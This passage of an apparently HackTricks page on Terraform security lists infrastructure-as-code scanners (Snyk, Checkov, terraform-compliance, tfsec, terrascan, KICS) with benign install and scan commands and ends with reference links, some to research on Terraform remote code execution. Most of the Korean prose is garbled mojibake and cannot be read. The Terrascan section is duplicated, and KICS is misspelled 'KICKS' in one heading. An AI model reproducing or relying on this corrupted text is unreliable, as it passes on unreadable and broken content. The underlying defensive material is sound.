- ë³´ì•ˆ ì·¨ì•½ì  ë° ê·œì • ì¤€ìˆ˜ ë¬¸ì œì— ëŒ€í•œ ì‹¤ì‹œê°„ ìŠ¤ìºë‹.
- ë²„ì „ ê´€ë¦¬ ì‹œìŠ¤í…œ(GitHub, GitLab, Bitbucket)ê³¼ì˜ í†µí•©.
- ìë™ ìˆ˜ì • pull requests.
- ìƒì„¸í•œ ìˆ˜ì • ê¶Œê³ .
- **Sign Up:** Create an account on [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov**ëŠ” ì¸í”„ë¼ìŠ¤íŠ¸ëŸ­ì²˜ ì½”ë“œ(IaC)ì— ëŒ€í•œ ì •ì  ì½”ë“œ ë¶„ì„ ë„êµ¬ì´ì ì´ë¯¸ì§€ ë° ì˜¤í”ˆ ì†ŒìŠ¤ íŒ¨í‚¤ì§€ë¥¼ ìœ„í•œ ì†Œí”„íŠ¸ì›¨ì–´ êµ¬ì„± ë¶„ì„(SCA) ë„êµ¬ì…ë‹ˆë‹¤.

ì´ëŠ” [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), ë˜ëŠ” [OpenTofu](https://opentofu.org/)ë¡œ í”„ë¡œë¹„ì €ë‹ëœ í´ë¼ìš°ë“œ ì¸í”„ë¼ë¥¼ ìŠ¤ìº”í•˜ë©° ê·¸ë˜í”„ ê¸°ë°˜ ìŠ¤ìºë‹ìœ¼ë¡œ ë³´ì•ˆ ë° ì»´í”Œë¼ì´ì–¸ìŠ¤ êµ¬ì„± ì˜¤ë¥˜ë¥¼ íƒì§€í•©ë‹ˆë‹¤.

ì´ëŠ” [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md)ì„ ìˆ˜í–‰í•˜ë©°, ì´ëŠ” ì˜¤í”ˆ ì†ŒìŠ¤ íŒ¨í‚¤ì§€ì™€ ì´ë¯¸ì§€ì— ëŒ€í•œ Common Vulnerabilities and Exposures (CVEs) ê²€ìƒ‰ì„ ìœ„í•œ ìŠ¤ìº”ì…ë‹ˆë‹¤.
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

ë‹¤ìŒ [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance`ì€ terraformì— ëŒ€í•œ ê²½ëŸ‰ì˜ ë³´ì•ˆ ë° ê·œì •ì¤€ìˆ˜ ì¤‘ì‹¬ í…ŒìŠ¤íŠ¸ í”„ë ˆì„ì›Œí¬ë¡œ, infrastructure-as-codeì— ëŒ€í•´ ë„¤ê±°í‹°ë¸Œ í…ŒìŠ¤íŠ¸ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

- **compliance:** êµ¬í˜„ëœ ì½”ë“œê°€ ë³´ì•ˆ í‘œì¤€ ë° ìì²´ ì»¤ìŠ¤í…€ í‘œì¤€ì„ ì¤€ìˆ˜í•˜ëŠ”ì§€ í™•ì¸
- **behaviour driven development:** ìš°ë¦¬ëŠ” ê±°ì˜ ëª¨ë“  ê²ƒì— ëŒ€í•´ BDDë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. IaCì—ëŠ” ì™œ ì‚¬ìš©í•˜ì§€ ì•Šë‚˜ìš”?
- **portable:** `pip`ì—ì„œ ì„¤ì¹˜í•˜ê±°ë‚˜ `docker`ë¡œ ì‹¤í–‰í•˜ë©´ ë©ë‹ˆë‹¤. See [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** ì½”ë“œê°€ ë°°í¬ë˜ê¸° ì „ì— ê²€ì¦í•©ë‹ˆë‹¤
- **easy to integrate:** íŒŒì´í”„ë¼ì¸(ë˜ëŠ” git hooks)ì—ì„œ ì‹¤í–‰ë˜ì–´ ëª¨ë“  ë°°í¬ê°€ ê²€ì¦ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- **segregation of duty:** í…ŒìŠ¤íŠ¸ë¥¼ ë³„ë„ ë¦¬í¬ì§€í† ë¦¬ì— ë³´ê´€í•˜ì—¬ ë‹¤ë¥¸ íŒ€ì´ ì±…ì„ì§€ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

> [!NOTE]
> ì•ˆíƒ€ê¹ê²Œë„ ì½”ë“œê°€ ë‹¹ì‹ ì´ ì ‘ê·¼í•  ìˆ˜ ì—†ëŠ” ì¼ë¶€ providersë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤ë©´ `terraform plan`ì„ ìˆ˜í–‰í•  ìˆ˜ ì—†ê³  ì´ ë„êµ¬ë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

From the [**docs**](https://github.com/aquasecurity/tfsec): tfsecëŠ” terraform ì½”ë“œì— ëŒ€í•œ ì •ì  ë¶„ì„ì„ í†µí•´ ì ì¬ì ì¸ êµ¬ì„± ì˜¤ë¥˜ë¥¼ ì°¾ì•„ëƒ…ë‹ˆë‹¤.

- â˜ï¸ ëª¨ë“  ì£¼ìš”(ë° ì¼ë¶€ ë§ˆì´ë„ˆ) í´ë¼ìš°ë“œ ê³µê¸‰ìì— ëŒ€í•œ êµ¬ì„± ì˜¤ë¥˜ë¥¼ ê²€ì‚¬í•©ë‹ˆë‹¤
- â›” ìˆ˜ë°± ê°œì˜ ë‚´ì¥ ê·œì¹™
- ğŸª† ëª¨ë“ˆ(ë¡œì»¬ ë° ì›ê²©)ì„ ìŠ¤ìº”í•©ë‹ˆë‹¤
- â• HCL ì‹ê³¼ ë¦¬í„°ëŸ´ ê°’ì„ í‰ê°€í•©ë‹ˆë‹¤
- â†ªï¸ Terraform í•¨ìˆ˜(ì˜ˆ: `concat()`)ë¥¼ í‰ê°€í•©ë‹ˆë‹¤
- ğŸ”— Terraform ë¦¬ì†ŒìŠ¤ ê°„ì˜ ê´€ê³„ë¥¼ í‰ê°€í•©ë‹ˆë‹¤
- ğŸ§° Terraform CDKì™€ í˜¸í™˜ë©ë‹ˆë‹¤
- ğŸ™… ì‚¬ìš©ì ì •ì˜ Rego ì •ì±…ì„ ì ìš©(ë° ë³´ì™„)í•©ë‹ˆë‹¤
- ğŸ“ƒ ì—¬ëŸ¬ ì¶œë ¥ í˜•ì‹ì„ ì§€ì›í•©ë‹ˆë‹¤: lovely (default), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- ğŸ› ï¸ CLI í”Œë˜ê·¸ ë°/ë˜ëŠ” ì„¤ì • íŒŒì¼ì„ í†µí•´ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤
- âš¡ ë§¤ìš° ë¹ ë¥´ë©° ëŒ€ê·œëª¨ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ë¹ ë¥´ê²Œ ìŠ¤ìº”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascanì€ Infrastructure as Codeë¥¼ ìœ„í•œ ì •ì  ì½”ë“œ ë¶„ì„ê¸°ì…ë‹ˆë‹¤. Terrascanì„ ì‚¬ìš©í•˜ë©´ ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- infrastructure as codeì˜ êµ¬ì„± ì˜¤ë¥˜ë¥¼ ì›í™œí•˜ê²Œ ìŠ¤ìº”í•©ë‹ˆë‹¤.
- í”„ë¡œë¹„ì €ë‹ëœ cloud infrastructureë¥¼ ëª¨ë‹ˆí„°ë§í•˜ì—¬ posture driftë¥¼ ì´ˆë˜í•˜ëŠ” êµ¬ì„± ë³€ê²½ì„ ê°ì§€í•˜ê³ , ì•ˆì „í•œ ìƒíƒœë¡œ ë˜ëŒë¦´ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
- ë³´ì•ˆ ì·¨ì•½ì  ë° ê·œì • ì¤€ìˆ˜ ìœ„ë°˜ì„ íƒì§€í•©ë‹ˆë‹¤.
- cloud native infrastructureë¥¼ í”„ë¡œë¹„ì €ë‹í•˜ê¸° ì „ì— ìœ„í—˜ì„ ì™„í™”í•©ë‹ˆë‹¤.
- ë¡œì»¬ì—ì„œ ì‹¤í–‰í•˜ê±°ë‚˜ CI\CDì— í†µí•©í•  ìˆ˜ ìˆëŠ” ìœ ì—°ì„±ì„ ì œê³µí•©ë‹ˆë‹¤.
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Checkmarxì˜ **KICS**ë¡œ ê°œë°œ ì‚¬ì´í´ ì´ˆê¸°ì— infrastructure-as-codeì˜ ë³´ì•ˆ ì·¨ì•½ì , ê·œì • ì¤€ìˆ˜ ë¬¸ì œ ë° ì¸í”„ë¼ êµ¬ì„± ì˜¤ë¥˜ë¥¼ ì°¾ì•„ë‚´ì„¸ìš”.

**KICS**ëŠ” **K**eeping **I**nfrastructure as **C**ode **S**ecureì˜ ì•½ìì´ë©°, ì˜¤í”ˆ ì†ŒìŠ¤ì´ê³  ëª¨ë“  cloud native í”„ë¡œì íŠ¸ì— í•„ìˆ˜ì ì…ë‹ˆë‹¤.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascanì€ Infrastructure as Codeë¥¼ ìœ„í•œ ì •ì  ì½”ë“œ ë¶„ì„ê¸°ì…ë‹ˆë‹¤. Terrascanì„ ì‚¬ìš©í•˜ë©´ ë‹¤ìŒì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- Infrastructure as Codeì˜ ì˜ëª»ëœ êµ¬ì„±(misconfigurations)ì„ ì›í™œí•˜ê²Œ ìŠ¤ìº”í•©ë‹ˆë‹¤.
- í”„ë¡œë¹„ì €ë‹ëœ í´ë¼ìš°ë“œ ì¸í”„ë¼ì—ì„œ ë³´ì•ˆ íƒœì„¸ ë³€ë™ì„ ìœ ë°œí•˜ëŠ” êµ¬ì„± ë³€ê²½ì„ ëª¨ë‹ˆí„°ë§í•˜ê³ , ì•ˆì „í•œ íƒœì„¸ë¡œ ë˜ëŒë¦´ ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.
- ë³´ì•ˆ ì·¨ì•½ì ê³¼ ì»´í”Œë¼ì´ì–¸ìŠ¤ ìœ„ë°˜ì„ ê°ì§€í•©ë‹ˆë‹¤.
- í´ë¼ìš°ë“œ ë„¤ì´í‹°ë¸Œ ì¸í”„ë¼ë¥¼ í”„ë¡œë¹„ì €ë‹í•˜ê¸° ì „ì— ìœ„í—˜ì„ ì™„í™”í•©ë‹ˆë‹¤.
- ë¡œì»¬ì—ì„œ ì‹¤í–‰í•˜ê±°ë‚˜ CI\CDì™€ í†µí•©í•  ìˆ˜ ìˆëŠ” ìœ ì—°ì„±ì„ ì œê³µí•©ë‹ˆë‹¤.
```bash
brew install terrascan
```
## ì°¸ê³ ìë£Œ

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API â€“ Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI â€“ OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider â€“ Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform â€“ Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs â€“ Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
